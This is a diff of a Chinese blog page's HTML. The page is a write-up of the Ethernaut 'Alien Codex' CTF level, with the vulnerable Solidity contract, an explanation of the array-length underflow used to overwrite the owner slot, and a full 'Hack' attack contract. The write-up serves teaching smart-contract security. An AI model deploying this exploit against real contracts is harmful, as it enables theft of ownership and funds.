@@ -35,21 +35,21 @@
   <!-- feed -->
   <!-- 页面元数据 -->
   <title>Alien Codex - 笔友🍉の知识库</title>
-  <meta name="keywords" content="靶场,Solidity,null">
+  <meta name="keywords" content="Solidity,靶场,null">
   <meta desc name="description" content="Self-Discipline - 笔友🍉 - 笔友🍉の知识库">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="Alien Codex">
 <meta property="og:url" content="https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/index.html">
 <meta property="og:site_name" content="笔友🍉の知识库">
-<meta property="og:description" content="Alien Codex1. 题目要求 1.1 你打开了一个 Alien 合约. 申明所有权来完成这一关.  这可能有帮助  理解Array Storage是怎么回事 理解 ABI specifications 使用一个非常 狗 方法   1.2 题目代码：  &#x2F;&#x2F; SPDX-License-Identifier: MIT pragma solidity ^0.5.0;  import &#39;.">
+<meta property="og:description" content="Alien Codex1. 题目要求 1.1 你打开了一个 Alien 合约. 申明所有权来完成这一关.  这可能有帮助  理解Array Storage是怎么回事 理解 ABI specifications 使用一个非常 狗 方法   1.2 题目代码：   12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-01-19T04:10:10.000Z">
 <meta property="article:modified_time" content="2023-01-19T04:10:10.000Z">
 <meta property="article:author" content="笔友🍉">
-<meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：567 字</p>
+      <p>字数：535 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3058,41 +3058,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li><p>1.2 题目代码：</p>
 </li>
-<li><pre><code class="solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.5.0;
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-import &#39;../helpers/Ownable-05.sol&#39;;
 
-contract AlienCodex is Ownable &#123;
 
-  bool public contact;
-  bytes32[] public codex;
-
-  modifier contacted() &#123;
-    assert(contact);
-    _;
-  &#125;
-  
-  function make_contact() public &#123;
-    contact = true;
-  &#125;
-
-  function record(bytes32 _content) contacted public &#123;
-    codex.push(_content);
-  &#125;
-
-  function retract() contacted public &#123;
-    codex.length--;
-  &#125;
-
-  function revise(uint i, bytes32 _content) contacted public &#123;
-    codex[i] = _content;
-  &#125;
-&#125;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 2. 分析</span><br><span class="line"></span><br><span class="line">#### tips: [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)</span><br><span class="line"></span><br><span class="line">- 2.1 在 AlienCodex 合约中，我们可以利用该`retract()`函数导致数组长度出现整数下溢`codex`。这个下溢允许我们通过函数修改合约中的任何状态变量`revise()`。该漏洞可以按如下方式执行：</span><br><span class="line"></span><br><span class="line">  1. 调用`make_contact()`函数通过`contacted()`修饰符检查，要求`contact`为真。</span><br><span class="line">  2. 调用`retract()`函数导致数组`codex`长度整数溢出</span><br><span class="line">  3. 通过以下方式找到状态变量的散列，`owner`就好像它是`codex`数组的一部分一样：</span><br><span class="line"></span><br><span class="line">  - 获取数组中第一项的哈希值`codex`（因为它在合约存储中被索引），对应于它在合约存储中的槽位。这可以通过计算第一个*位置*的 Keccak256 哈希值来获得，因此：`keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`。</span><br><span class="line">  - 取由此 ( `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) 产生的哈希值，并从合约中的最大插槽数量中减去其整数值加一 (2个256−1个), 大概是这样的：</span><br><span class="line">  - ![image-20230225150415772](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020020955.png)d.使用这个结果值作为`revise()`要修改的`i`数组的（索引)和我们的地址。`codex``_content`</span><br><span class="line"></span><br><span class="line">- 2.2  [参考视频](https://www.youtube.com/watch?v=2onc3F6Lbg0) 写的攻击合约</span><br><span class="line"></span><br><span class="line">- ```solidity</span><br><span class="line">  interface IAlienCodex &#123;</span><br><span class="line">      function owner() external view returns (address);</span><br><span class="line">      function make_contact() external;</span><br><span class="line">      function revise(uint i, bytes32 _content) external;</span><br><span class="line">      function retract() external;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  contract Hack &#123;</span><br><span class="line">    constructor(IAlienCodex target) &#123;</span><br><span class="line">      target.make_contact();</span><br><span class="line">      target.retract();</span><br><span class="line">  </span><br><span class="line">      uint256 h = uint256(keccak256(abi.encode(uint256(1))));</span><br><span class="line">      uint256 i = uint256(0) - h;</span><br><span class="line">      // unchecked &#123;</span><br><span class="line">      //   i = i - h;</span><br><span class="line">      // &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      target.revise(i, bytes32(uint256(uint160(msg.sender))));</span><br><span class="line">      require(target.owner() == msg.sender, &quot;Hack Failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
-</code></pre>
+<h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><h4 id="tips-参考博客"><a href="#tips-参考博客" class="headerlink" title="tips: 参考博客"></a>tips: <a target="_blank" rel="noopener" href="https://dac.ac/blog/ethernaut_solutions/#delegation">参考博客</a></h4><ul>
+<li><p>2.1 在 AlienCodex 合约中，我们可以利用该<code>retract()</code>函数导致数组长度出现整数下溢<code>codex</code>。这个下溢允许我们通过函数修改合约中的任何状态变量<code>revise()</code>。该漏洞可以按如下方式执行：</p>
+<ol>
+<li>调用<code>make_contact()</code>函数通过<code>contacted()</code>修饰符检查，要求<code>contact</code>为真。</li>
+<li>调用<code>retract()</code>函数导致数组<code>codex</code>长度整数溢出</li>
+<li>通过以下方式找到状态变量的散列，<code>owner</code>就好像它是<code>codex</code>数组的一部分一样：</li>
+</ol>
+<ul>
+<li>获取数组中第一项的哈希值<code>codex</code>（因为它在合约存储中被索引），对应于它在合约存储中的槽位。这可以通过计算第一个<em>位置</em>的 Keccak256 哈希值来获得，因此：<code>keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)</code>。</li>
+<li>取由此 ( <code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>) 产生的哈希值，并从合约中的最大插槽数量中减去其整数值加一 (2个256−1个), 大概是这样的：</li>
+<li><img src="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020020955.png" alt="image-20230225150415772">d.使用这个结果值作为<code>revise()</code>要修改的<code>i</code>数组的（索引)和我们的地址。<code>codex``_content</code></li>
+</ul>
+</li>
+<li><p>2.2  <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=2onc3F6Lbg0">参考视频</a> 写的攻击合约</p>
 </li>
 </ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">interface IAlienCodex &#123;</span><br><span class="line">    function owner() external view returns (address);</span><br><span class="line">    function make_contact() external;</span><br><span class="line">    function revise(uint i, bytes32 _content) external;</span><br><span class="line">    function retract() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(IAlienCodex target) &#123;</span><br><span class="line">    target.make_contact();</span><br><span class="line">    target.retract();</span><br><span class="line"></span><br><span class="line">    uint256 h = uint256(keccak256(abi.encode(uint256(1))));</span><br><span class="line">    uint256 i = uint256(0) - h;</span><br><span class="line">    // unchecked &#123;</span><br><span class="line">    //   i = i - h;</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target.revise(i, bytes32(uint256(uint160(msg.sender))));</span><br><span class="line">    require(target.owner() == msg.sender, &quot;Hack Failed&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2><ul>
 <li>3.1 获取关卡实例地址：0x175A96bA1755F20E85ff80089ec9000dD0df463e</li>
 <li>3.2 将实例地址作为参数进行对攻击合约的部署</li>
@@ -3172,8 +3162,8 @@ contract AlienCodex is Ownable &#123;
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div>
-  <span hidden itemprop="keywords">靶场 Solidity</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div>
+  <span hidden itemprop="keywords">Solidity 靶场</span>
 
 
         
@@ -3373,7 +3363,7 @@ contract AlienCodex is Ownable &#123;
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-text">2. 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tips-%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">tips: 参考博客</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
     </div>
   </section>
 
@@ -4421,7 +4411,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/19/Smart contracts/ethernaut/Alien Codex/","name":"Alien Codex"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Alien Codex","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/","wordCount":0,"datePublished":"2023-01-19T04:10:10.000Z","dateModified":"2023-01-19T04:10:10.000Z","articleSection":"Smart contracts","keywords":"靶场,Solidity","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/19/Smart contracts/ethernaut/Alien Codex/","name":"Alien Codex"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Alien Codex","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/","wordCount":0,"datePublished":"2023-01-19T04:10:10.000Z","dateModified":"2023-01-19T04:10:10.000Z","articleSection":"Smart contracts","keywords":"Solidity,靶场","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
